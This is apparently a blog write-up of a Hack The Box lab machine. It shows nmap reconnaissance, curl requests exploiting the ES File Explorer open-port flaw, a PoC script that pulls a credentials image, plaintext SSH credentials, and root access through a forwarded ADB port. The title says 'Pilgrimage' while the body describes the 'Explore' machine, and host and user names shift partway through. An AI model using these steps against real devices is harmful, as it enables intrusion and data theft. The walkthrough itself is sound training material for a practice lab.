---
layout: single
title: '<span class="htb">Hack The Box - Machine - Pilgrimage</span>'
excerpt: "Welcome to the writeup of the pilgrimage machine of the Hack The Box platform. Pilgrimage is an easy difficulty linux machine."
date: 2023-10-23
header:
  teaser: /assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_banner.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - android
  - hachthebox
  - walkthrough
  - writeup
tags:
  - esfileexplorer
  - forwarding
  - github
  - json
  - jsonapi
  - nmap
  - machine 
  - ssh
  - writeup
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---









<!-- BANNER -->
<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_banner.png">
    <img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_banner.png" alt="Hack The Box - Machine - Explore">
</a>

Welcome to the writeup of the **explore machine** of the Hack The Box platform. Explore is an **easy** difficulty machine on android.

# Before starting
Connect to **Hack The Box VPN** in background with `TMUX`
```bash
tmux new -s htb
sudo openvpn ~/.vpn/htb.ovpn
```

**Add** machine to `/etc/hosts` file, **check connection** with `ping` and **create work folders**
```bash
echo '10.10.10.247 explore.htb' >> /etc/hosts
ping -c 4 explore.htb
mkdir -p ~/htb/explorer.htb/{exploits,fuzz,http,nmap}
```

# Recon
Check **all open ports**, detect the service and its version with `nmap`
```bash
nmap -sC -sV -p- -T4 --min-rate=1000 -v -oA all explore.htb
```
```nmap
Nmap scan report for explore.htb (10.10.10.247)
Host is up (0.048s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
44347/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:00:48 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Sat, 30 Oct 2021 11:00:48 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Sat, 30 Oct 2021 11:00:53 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:01:08 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:00:53 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:01:08 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:01:08 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 30 Oct 2021 11:01:08 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.92%I=7%D=10/30%Time=617D2253%P=x86_64-pc-linux-gnu%r(N
SF:ULL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44347-TCP:V=7.92%I=7%D=10/30%Time=617D2252%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x2
SF:030\x20Oct\x202021\x2011:00:48\x20GMT\r\nContent-Length:\x2022\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
SF:\r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412
SF:\x20Precondition\x20Failed\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2011:
SF:00:48\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1
SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Sat,\x2030\x20Oct\x202021\
SF:x2011:00:53\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
SF:20supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20
SF:Request\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2011:00:53\x20GMT\r\nCon
SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
SF::\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Sat,\x2030\x20Oct\x202021\x2011:01:08\x20GMT\r\nContent-Length:
SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionRe
SF:q,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x2030\x20Oct\
SF:x202021\x2011:01:08\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
SF:?\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalS
SF:erverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x20
SF:30\x20Oct\x202021\x2011:01:08\x20GMT\r\nContent-Length:\x2054\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
SF:shash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Date:\x20Sat,\x2030\x20Oct\x202021\x2011:01:08\x20GMT\r\nContent-Length
SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_nmap.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_nmap.png"></a>

Open firefox to inspect website
```bash
firefox http://explore.htb:59777 &
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_001.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_001.png"></a>

Nothing interesting 😥, let's look for information....

On port **42135** is running **ES File Explorer**, a public vulnerability that I was already testing the PoC of [fs0c131y's Github](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln), I could see that [JSONAPI](https://github.com/alecgorge/jsonapi) is a Bukkit add-on, which allows to consume an API, maybe they can be related.

By reading the README.md from the repository, you can generate a payload to test the vulnerability.

```bash
curl --header "Content-Type: application/json" --request POST --data '{"command":"getDeviceInfo"}' http://explore.htb:59777
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_002.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_002.png"></a>

<a href="/assets/images/others/anthony_adams_rubbing_hands.jpg"><img src="/assets/images/others/anthony_adams_rubbing_hands.jpg"></a>

After searching for interesting files, I found an image with the credentials of the user `kriti` located in the `/storage/emulated/0/DCIM/creds.jpg` folder.
```bash
curl --header "Content-Type: application/json" --request POST --data '{"command":"listPics"}' http://explore.htb:59777
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_003.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_003.png"></a>

To get `creds.jpg` use this command:
```txt
python exploit_ESFileExplorer.py --get-file /storage/emulated/0/DCIM/creds.jpg --host explore.htb
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_004.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_004.png"></a>

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_005.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_005.png"></a>

Credentials
```txt
kristi:Kr1sT!5h@Rp3xPl0r3!
```

# Gain Access
SSH service is running on port `2222`, connect with the credentials and show `user.txt` flag
```bash
ssh -p 2222 kristi@explore.htb
cat /sdcard/user.txt
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_user.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_user.png"></a>

# Privilege Escalation
Checking the network connections, we observe that port `5555` is listening, this port is used by default by `ADB` (Android Debug Bridge).
```bash
netstat -nlpt
```

<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_006.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_006.png"></a>

So lets try to port **forward** it through ssh and try to connect it through our box
```bash
ssh -p 2222 kristi@explore.htb -L 5555:localhost:5555
```

Use `adb` to get root access, find flag and show.
```bash
adb -s localhost:5555 root
```
```bash
adb -s localhost:5555 shell
```
```bash
find / -name "root.txt" 2>/dev/null
```
```bash
cat /data/root.txt
```
<a href="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_root.png"><img src="/assets/images/htb-machine-pilgrimage/htb-machine-pilgrimage_root.png"></a>

<a href="/assets/images/others/boom.gif"><img src="/assets/images/others/boom.gif"></a>